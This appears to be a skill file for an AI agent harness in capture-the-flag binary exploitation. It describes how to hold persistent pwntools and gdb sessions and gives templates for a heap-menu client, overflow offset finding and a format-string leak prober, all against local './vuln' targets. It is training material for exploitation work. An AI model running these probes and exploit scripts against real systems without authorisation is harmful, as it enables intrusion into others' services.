---
name: sessions
description: Persistent interactive sessions — pwntools conn and gdb dbg harness
category: harness
phase: exploit
---
Execution policy: follow `skills/_shared/SKILL_CONTRACT.md`; separate evidence from inference, preserve scope, validate each link, and label uncertainty.

# SESSIONS — Persistent Interactive Sessions (Harness Skill)

> THE key harness skill. Technique-only, no real flags. All interactive
> service work uses a held `conn` (pwntools tube) or `dbg` (gdb) object
> across turns — never one-shot shell pipes.

## Mental Model

1. **One-shot `echo payload | nc host port` fails: state is lost.** Every
   pipe opens a FRESH process — heap resets, canary/PIE re-roll
   (non-fork), menu resets to banner. A leak from connection #1 is
   meaningless to connection #2 under ASLR. Multi-stage exploits (leak
   → compute → payload) MUST share one instance.
2. **The fix is a persistent tube held across turns.** One
   `conn = remote(HOST, PORT)` (or `process('./vuln')`) owns the single
   service instance: `sendlineafter`/`recvuntil` advance ONE state
   machine (banner → menu → leak → exploit). Buffers and timeouts shared.
3. **`conn` ≠ `dbg`:** `conn` is the wire (menus, leaks, payload, shell
   upgrade); `dbg` is the microscope on a LOCAL copy
   (`gdb.attach`/`gdb.debug`: breakpoints, `vmmap`, crash analysis).
   Never attach `dbg` to the REMOTE service.
4. **Prompts are the protocol.** Every `send` pairs with an expected
   `recv` (`b'>'`, `b':'`, `b'choice:'`). Unmatched `recvuntil` = desync,
   the #1 session bug. On desync: drain `recv(timeout=2)`, log raw bytes,
   re-baseline — never blind-send more payloads.
5. **Timeouts are data.** `recvuntil` timeout = crash, wrong-input wait,
   or shell reached (needs `interactive()` upgrade). Classify first.
6. **Transcripts are the audit trail.** Timestamped send/recv to
   `artifacts/<task>/transcript.txt`, flag redacted. No transcript, no handoff.
7. **Lead owns slots; Worker owns the tube.** ≤2 concurrent session tasks,
   independent targets only; never two workers on ONE live service or one
   `conn` shared across tasks.

## Workflow

### Phase 1 — Baseline (session recon, no state change)

1. Banner + prompt bytes (repr, incl. spaces/newlines) via ONE local `conn`.
2. One benign round-trip per menu op (small alloc, echo string, one `%p`).
3. Note ASLR mode (`aslr=False` deterministic vs default ASLR-on realism).
4. Write `artifacts/<task>/session_baseline.txt`: prompts, menu map,
   banner hash, latency. `close()` or keep per task order — no orphans.

Reasoning Checkpoint: `Baseline complete — prompts=P, menu=M, echo=E, aslr=A — proceed to Confirmation?`

### Phase 2 — Confirmation (prompt-sync + primitive over held conn)

1. Two consecutive `sendlineafter`/`recvuntil` round-trips ≤5s = sync proven.
2. ONE primitive over the same tube: cyclic crash (local), `%p`
   reflection, or alloc/free/show cycle. No weaponized chain.
3. `dbg` path on local copy: `gdb.attach`/`gdb.debug` + 3-line gdbscript
   (`b main`, `c`), confirm breakpoint + readable `vmmap`.
4. Record fork-vs-reroll: same canary/heap across 2 conns = fork (brute
   viable); different = reroll (need leak).

Reasoning Checkpoint: `Confirmation complete — sync=X, prim=Y, dbg=Z, fork|reroll=F — proceed to Negative?`

### Phase 3 — Negative (desync traps, ≤3 probes)

1. One WRONG menu choice → record error path: drop or recover? Scripts must
   handle reconnect + re-baseline if it drops.
2. One off-by-whitespace prompt probe → freeze normalized prompt bytes now.
3. Close + reconnect: compare banner/canary/heap. Forking vs fresh-exec
   decides brute-force viability. Cap 3 probes, then freeze table + policy.

Reasoning Checkpoint: `Negative complete — err=X, norm=Y, restart=fork|reroll — proceed to gated Exploit?`

### Phase 4 — Exploit (ONE gated session script, ≤120s)

1. Write `artifacts/<task>/session_exploit.py` from T1/T2/T3: frozen
   prompts, `timeout=5`, `log.success` per leak, assert before chaining.
2. `timeout 120 python3 ... LOCAL` → marker/shell. Then REMOTE once.
3. Shell signal (`$`/`#`, `win` output): batch mode sends
   `echo MARKER; id` + `recvuntil(b'MARKER')`; `interactive()` attended-only.
4. Crash/desync: keep 500B tail + `poll()` status, fix ONE variable next turn.

Reasoning Checkpoint: `Exploit complete — local=X, remote=Y|skipped, conn=Z — proceed to Validation-handoff?`

### Phase 5 — Validation-handoff (stability + package)

1. Two stable local reruns (flake check); ≤1 extra remote confirm if forking.
2. Transcript check: every send matched, leaks in hex, `FLAG{...}` redacted.
3. Package `session_exploit.py` + `transcript.txt` + `session_baseline.txt`
   + prompt table + reconnect policy + leak math + final command.
4. `solved` (shell/marker) or `blocked(desync|crash|need-dbg)` with 500B tail.
5. Close all tubes, kill stray `gdb`/`socat` — no orphans.

Reasoning Checkpoint: `Handoff complete — status=solved|blocked, reruns=X/2 — end.`

## Tool Table (exact copy-paste commands)

| Goal | Command |
|---|---|
| Held remote tube | `python3 -c "from pwn import *; io=remote('127.0.0.1',1337,timeout=5); print(io.recv(timeout=3))"` |
| Held local tube | `python3 -c "from pwn import *; io=process('./vuln'); io.sendlineafter(b':',b'test'); print(io.recv(timeout=3))"` |
| Sync check | `python3 -c "from pwn import *; io=process('./vuln'); io.sendlineafter(b'>',b'1'); io.recvuntil(b':',timeout=5); print('synced')"` |
| Drain desync | `python3 -c "from pwn import *; io=process('./vuln'); print(repr(io.recv(timeout=2)))"` |
| Crash poll | `python3 -c "from pwn import *; io=process('./vuln'); io.sendline(b'X'*512); print(io.poll(timeout=3))"` |
| gdb.debug | `python3 -c "from pwn import *; io=gdb.debug('./vuln',gdbscript='b main\nc',aslr=False); io.interactive()"` |
| gdb.attach | `python3 -c "from pwn import *; p=process('./vuln'); gdb.attach(p,gdbscript='b main\nc')"` |
| Core offset | `python3 -c "from pwn import *; p=process('./vuln'); p.sendline(cyclic(512)); p.wait(timeout=5); print(cyclic_find(p.corefile.read(p.corefile.rsp,8)))"` |
| Fork server (test) | `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./vuln` |
| Banner grab | `timeout 5 nc 127.0.0.1 1337 \| head -20` |
| Template gen | `pwn template --host 127.0.0.1 --port 1337 ./vuln > /tmp/tpl.py` |
| Kill strays | `pkill -f session_exploit; pkill -f "gdb.*vuln"; jobs` |

## Payload / Code Library

### T0 — Persistent `conn` + `dbg` patterns (the canonical rule)

```python
#!/usr/bin/env python3
"""ONE conn owns the session. Never split stages across shell pipes."""
from pwn import *
HOST, PORT = '127.0.0.1', 1337
PROMPT = b'>'  # frozen exact bytes from Phase 1
def connect():
    if args.REMOTE: return remote(HOST, PORT, timeout=5)
    if args.GDB: return gdb.debug('./vuln', gdbscript='b main\nc', aslr=False)
    return process('./vuln')
io = connect()
io.sendlineafter(PROMPT, b'1', timeout=5)  # every send prompt-gated
io.recvuntil(PROMPT, timeout=5)            # every send expects a recv
# leak -> compute -> payload ALL on this same `io`; interactive() last, attended-only
```

```python
# dbg microscope (LOCAL copy only, never remote):
io = gdb.debug('./vuln', aslr=False, gdbscript='b main\nc\ntelescope $rsp 32\n')
# or attach mid-session: gdb.attach(p, gdbscript='b *main+42\nc\nx/10gx $rsp\nbt')
# aslr=False for deterministic offsets; re-run ASLR-on before remote.
# crash parse: p.wait(timeout=5); off = cyclic_find(p.corefile.read(p.corefile.rsp, 8))
```

### T1 — TEMPLATE menu-driven pwn service client (adapt indices/prompts)

```python
#!/usr/bin/env python3
from pwn import *
HOST, PORT = '127.0.0.1', 1337
MENU = b'>'; TIMEOUT = 5
logfp = open('artifacts/task/transcript.txt', 'a')  # redact flag at handoff
def slog(d, recv=True):
    logfp.write(f"[{'RECV' if recv else 'SEND'}] {d!r}\n"); logfp.flush()
def connect():
    return remote(HOST, PORT, timeout=TIMEOUT) if args.REMOTE else process('./vuln')
def menu(io, c): io.sendlineafter(MENU, str(c).encode(), timeout=TIMEOUT); slog(c, False)
def alloc(io, i, s, d):
    menu(io, 1); io.sendlineafter(b'idx', str(i).encode()); io.sendlineafter(b'size', str(s).encode())
    io.sendlineafter(b'data', d); r = io.recvuntil(MENU, timeout=TIMEOUT); slog(r); return r
def free(io, i):
    menu(io, 2); io.sendlineafter(b'idx', str(i).encode()); r = io.recvuntil(MENU, timeout=TIMEOUT); slog(r); return r
def show(io, i):
    menu(io, 3); io.sendlineafter(b'idx', str(i).encode()); r = io.recvline(timeout=TIMEOUT); slog(r)
    io.recvuntil(MENU, timeout=TIMEOUT); return r
def edit(io, i, d):
    menu(io, 4); io.sendlineafter(b'idx', str(i).encode()); io.sendlineafter(b'data', d)
    r = io.recvuntil(MENU, timeout=TIMEOUT); slog(r); return r
io = connect(); slog(io.recv(timeout=TIMEOUT))
# flow: alloc(io,0,0x28,b'A'*8); free(io,0); leak = show(io,0)
```

### T2 — TEMPLATE gdb breakpoint-and-leak script (adapt breakpoints)

```python
#!/usr/bin/env python3
from pwn import *
BIN = './vuln'; elf = ELF(BIN)
io = gdb.debug(BIN, aslr=False, gdbscript='b main\nc\ntelescope $rsp 40\n')
io.recvuntil(b':', timeout=5)
io.sendline(cyclic(256))
# In gdb window: note $rip/saved-ret, then:
#   pwndbg> telescope $rsp 40  # find 0x616161.. words
#   pwndbg> cyclic -l $rip     # GEF offset lookup
#   pwndbg> vmmap              # .text base == elf.address (aslr=False)
io.wait(timeout=5)
try:
    off = cyclic_find(io.corefile.read(io.corefile.rsp, 8))
    log.success(f'offset={off}')
except Exception as e:
    log.warning(f'no core (gdb holds proc): {e}')
```

### T3 — TEMPLATE blind format-string prober loop (adapt prompt)

```python
#!/usr/bin/env python3
from pwn import *
BIN = './vuln'; PROMPT = b':'; TIMEOUT = 3
mk = lambda: process(BIN)  # remote(HOST, PORT, timeout=TIMEOUT) when remote
def probe(payload: bytes) -> bytes:
    io = mk()
    try:
        io.sendlineafter(PROMPT, payload, timeout=TIMEOUT)
        return io.recvall(timeout=TIMEOUT)
    except EOFError:
        return b'<EOF/crash>'
    finally:
        io.close()
for i in range(1, 31):  # positional sweep for our marker
    if b'41414141' in probe(f'AAAA.%{i}$p'.encode()):
        log.success(f'marker echoes at {i}'); break
else:
    log.failure('no fmt reflection 1..30'); raise SystemExit(1)
POS = i
vals = [x for x in probe(b'%p.' * 24).split(b'.') if x.startswith(b'0x')]
for k, v in enumerate(vals): log.info(f'stack[{k}] = {v.decode()}')
# canary: run-stable, ends 00, idx ~6-15. PIE: 0x55.. minus offset == elf.address.
# libc: 0x7f..; verify low12 across 2 runs before trusting.
```

### T4 — State machine + stall-guard snippet (paste into solves)

```python
# States: BANNER -> MENU -> ACTION -> LEAK -> EXPLOIT -> SHELL
last_cmd, repeats = b'', 0
def synced_send(io, prompt, data, expect, timeout=5):
    global last_cmd, repeats
    if data == last_cmd:
        repeats += 1
        if repeats >= 3: raise RuntimeError('STALL: 3 identical cmds — change ONE variable')
    else: repeats, last_cmd = 0, data
    io.sendlineafter(prompt, data, timeout=timeout)
    return io.recvuntil(expect, timeout=timeout)
def recv_classify(io, expect, timeout=5):
    try: return ('ok', io.recvuntil(expect, timeout=timeout))
    except EOFError: return ('eof-crash', io.recvall(timeout=2))
    except Exception:
        tail = io.recv(timeout=2)
        return ('maybe-shell' if b'$' in tail or b'#' in tail else 'timeout-desync', tail)
```

## Decision Tree

```text
Need to talk to a service?
├─ tempted by echo | nc one-shot? → NO. Always a held-conn script (T0).
├─ local copy? YES → develop on process()/gdb.debug first.
│  NO (remote only) → banner-grab + T3 single probes till prompt table
│  frozen; then ONE T1 script, remote connects ≤3 total.
├─ shape? menu → T1; echo/fmt → T3 then held-conn WRITE; login →
│  recvuntil+sendlineafter, ≤3 tries (more = hard gate to Lead);
│  shell ($/#) → proof cmd (echo MARKER; id)+recvuntil, interactive() attended-only.
├─ debug? deterministic → gdb.debug aslr=False + T2; realism → ASLR-on
│  re-run; crash → corefile+cyclic_find or gdb bt.
├─ unhealthy? timeout → drain+classify; EOF → poll()+500B tail+re-baseline;
│  3 identical cmds → STALL, change one variable; reroll addrs → need leak, no brute.
└─ done → 2 reruns + redacted transcript + handoff (Phase 5).
```

### Lead dispatch contract (how Lead tasks a session worker)

```text
TASK <name> | target=<host:port|./vuln> | template=T1|T2|T3
  stop: <shell|marker|leak HEX> within 120s, remote tries ≤3
  artifact: artifacts/<name>/session_exploit.py + transcript.txt
  forbid: one-shot nc pipes; >3 identical cmds; interactive() in batch;
          2nd worker on same live service.
RESULT: Lead replays transcript, merges leak math into flag-path,
  re-tasks with ONE changed variable on failure.
HARD GATES (operator_ping, other work continues): flag submit, manual
  interaction, scope ambiguity, unbounded brute (>256 tries).
```

## AI Automation Notes

- **Timeouts**: recv `timeout=5`, drains `timeout=2`, script `timeout 120`;
  `interactive()` never in batch — proof-cmd + `recvuntil(MARKER)` instead.
- **Retry caps (@3)**: ≤3 identical cmds (stall-guard raises); ≤3 negative
  probes; ≤3 remote connects/task → `blocked` with transcript tail.
  One variable changes per retry (prompt, timeout, reconnect, offset).
- **Prompt table**: freeze repr bytes in Phase 1; all sends via
  `sendlineafter(frozen, ...)`; fix the TABLE once on mismatch.
- **Conn hygiene**: one `conn`/script; `close()` in `finally`/EOF;
  `pkill -f session_exploit` before re-run; never share tubes across workers.
- **Transcripts**: timestamped SEND/RECV; redact `FLAG\{[^}]*\}` at handoff;
  include `poll()` outcome + leak hex asserts.
- **Brute limits**: ≤3 credential tries; ≤256 fork-brute iters only with
  Lead approval + stop-on-success; unbounded = hard gate.
- **ASLR**: develop `aslr=False`, confirm ASLR-on locally, then remote;
  record fork-vs-reroll — reroll kills address reuse.
- **Stop**: shell/marker proven; 3rd identical crash; no prompt-sync after
  re-baseline. Hand off either way.
- **Boundary**: this skill owns `conn`/`dbg` LIFECYCLE; `pwn` owns the bytes.
